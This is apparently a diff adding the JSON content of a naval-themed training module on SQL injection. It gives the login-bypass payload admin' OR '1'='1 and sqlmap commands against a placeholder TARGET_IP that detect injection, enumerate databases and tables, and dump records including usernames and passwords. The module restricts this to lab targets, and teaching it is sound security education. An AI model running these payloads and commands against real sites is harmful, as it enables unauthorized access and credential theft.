@@ -1,0 +1,111 @@
+{
+  "id": "module-15",
+  "title": "MODULE 15: SQL INJECTION (SQLi)",
+  "theme": {
+    "style": "naval",
+    "primaryColor": "#001B33",
+    "accentColor": "#00A8C6",
+    "textColor": "#E6F1F5"
+  },
+  "blocks": [
+
+    {
+      "type": "header",
+      "content": "WHAT IS SQL INJECTION?"
+    },
+    {
+      "type": "text",
+      "content": "SQL Injection (SQLi) is a vulnerability that allows attackers to insert harmful SQL commands into a website's database query. In naval style, it is like sending a secret message through a ship’s communication channel to access restricted areas inside the ship’s control system."
+    },
+    {
+      "type": "points",
+      "content": [
+        "Happens when user input is not filtered",
+        "Allows attackers to read or modify database data",
+        "Can bypass logins",
+        "Can lead to full server takeover"
+      ]
+    },
+
+    {
+      "type": "header",
+      "content": "HOW SQL INJECTION WORKS"
+    },
+    {
+      "type": "text",
+      "content": "A website sends queries to a database. If the site does not validate user input, attackers can insert SQL commands. The database will run the injected commands thinking they are part of the normal query."
+    },
+    {
+      "type": "points",
+      "content": [
+        "Normal input: admin",
+        "Injected input: admin' OR '1'='1",
+        "Result: Login bypass"
+      ]
+    },
+
+    {
+      "type": "header",
+      "content": "SQLMAP ON LAB TARGET (SAFE ONLY)"
+    },
+    {
+      "type": "text",
+      "content": "SQLMap is an automated SQL injection tool. We will use it only on safe lab targets like TryHackMe, DVWA, or your own test machines. In naval style, SQLMap is like deploying a drone that automatically checks every weak point in an enemy ship."
+    },
+
+    {
+      "type": "points",
+      "content": [
+        "Check if target is vulnerable:",
+        "Command: sqlmap -u \"http://TARGET_IP/test.php?id=1\" --batch",
+        "Why: Automatically tests for SQL injection in the parameter."
+      ]
+    },
+    {
+      "type": "points",
+      "content": [
+        "Enumerate database names:",
+        "Command: sqlmap -u \"http://TARGET_IP/test.php?id=1\" --dbs --batch",
+        "Why: Shows all databases inside the vulnerable server."
+      ]
+    },
+    {
+      "type": "points",
+      "content": [
+        "List tables inside a database:",
+        "Command: sqlmap -u \"http://TARGET_IP/test.php?id=1\" -D DATABASE_NAME --tables --batch",
+        "Why: Displays all tables inside a selected database."
+      ]
+    },
+    {
+      "type": "points",
+      "content": [
+        "Dump table data (extract records):",
+        "Command: sqlmap -u \"http://TARGET_IP/test.php?id=1\" -D DATABASE_NAME -T TABLE_NAME --dump --batch",
+        "Why: Retrieves usernames, passwords, or other sensitive data."
+      ]
+    },
+
+    {
+      "type": "header",
+      "content": "TESTING ON REALISTIC LAB ENVIRONMENTS"
+    },
+    {
+      "type": "text",
+      "content": "We will NOT use SQLMap on real websites. Only on lab targets. A training target behaves like a real server but is legal and safe for learning."
+    },
+    {
+      "type": "points",
+      "content": [
+        "On test.php vulnerable",
+        "Custom local servers"
+      ]
+    },
+
+    {
+      "type": "text",
+      "content": ">> MODULE 15 COMPLETE. NEXT WE MOVE TO XSS ADVANCED & BROKEN ACCESS CONTROL."
+    }
+
+  ]
+}
